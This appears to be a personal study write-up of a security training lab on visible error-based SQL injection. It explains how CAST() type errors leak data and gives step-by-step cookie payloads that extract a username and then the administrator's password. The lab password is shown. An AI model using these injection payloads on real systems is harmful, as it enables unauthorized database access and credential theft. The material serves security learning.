Misconfiguration of the database sometimes results in verbose error messages.
For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter:

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
- This shows the full query that the application constructed using our input.
- This makes it easier to construct a valid query containing a malicious payload

One way generating verbose error messages is to use **CAST()** function. This effectively turns blind SQL injection to visible one.

### CAST()
- It enables you to convert one data type to another.
- For example, consider a query containing the following statement:
```sql 
CAST((SELECT example_column FROM example_table) AS int)
```
Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:
```text
ERROR: invalid input syntax for type integer: "Example data"
```
This type of query may also be useful in cases where you're unable to trigger conditional responses because of a character limit imposed on the query.

## Steps to solve Lab-1
### Desc - Visible error-based SQL injection

1. First confirm that the parameter(tracking-id) is vulnerable to blind SQLi
Vulnerable parameter - tracking cookie(tracking-id)
**Note** - If the SQL query causes an error, then the application returns a verbose error message.

**Checking the above note by putting a single quote**
![[verbose_SQL_error_messages.png]]
From above we can clearly say that it is vulnerable to SQL injection.

2. Now, we are going to use subquery and CAST the query to an int data type and observe the error message:
```SQL 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' AND CAST((SELECT 1) AS int)--
```

Below performing on burp:
![[verbose_SQL_error_messages1.png]]
From above we can clearly see that, we are converting boolean to int.

3. Now, we are going to stop this error by using comparison operator:
![[verbose_SQL_error_messages2.png]]
From above, we can say that this is a valid query.

4. Now, we are going to search for username **administrator**:
query -->
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' AND 1=CAST((SELECT username FROM users) AS int)--
```

Below performing on burp:
![[verbose_SQL_error_messages3.png]]
**Reason for the above error message** - Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.

**To fix the above error, you need to delete the value of TrackingId**

Below performing on burp:
![[verbose_SQL_error_messages4.png]]
**Reason for the error** - Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.

5. Modifying the query to return only one row:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Below performing on burp:
![[verbose_SQL_error_messages5.png]]
**Result** - From this we get to know that administrator user exist. administrator user is the first user in the database.

6. Modifying the query to return password of **administrator user:
   query --> 
   ```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Below performing on burp:
![[verbose_SQL_error_messages6.png]]
**Result** - The password of administrator is "hcagwqe36smsksjk6ymq"